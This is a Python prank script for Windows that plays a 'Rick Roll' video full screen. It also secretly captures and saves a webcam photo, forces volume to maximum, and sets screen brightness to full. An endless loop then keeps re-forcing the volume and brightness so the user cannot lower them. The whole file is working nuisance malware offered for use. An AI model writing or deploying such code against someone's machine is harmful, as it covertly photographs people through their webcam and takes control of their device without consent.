import ctypes
from ctypes import cast, POINTER, windll
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import time
import vlc
import pafy
import screen_brightness_control as sbc
import os
import cv2

#logging
with open('log.txt', 'w') as f:
    f.write('.LOG\n You get rickrolled!')

#take photos with webcam
camera = cv2.VideoCapture(0)
for i in range(1):
    return_value, image = camera.read()
    cv2.imwrite('opencv'+str(i)+'.png', image)
del(camera)

#Set max volume
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
volume.GetMute()
volume.GetMasterVolumeLevel()
volume.GetVolumeRange()
volume.SetMasterVolumeLevel(0, None)

#initialise for playing Rickroll
url = "https://youtu.be/dQw4w9WgXcQ"
video = pafy.new(url)
best = video.streams[0]
media = vlc.MediaPlayer(best.url)

#Play RickRoll in full screen!
media.play()
media.toggle_fullscreen()

#stunt ur eyes
#get screen resolution
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

#max screen brightness
sbc.set_brightness(100)


while True:
  sbc.set_brightness(100)
  volume.SetMute(0, None)
  volume.SetMasterVolumeLevel(0, None)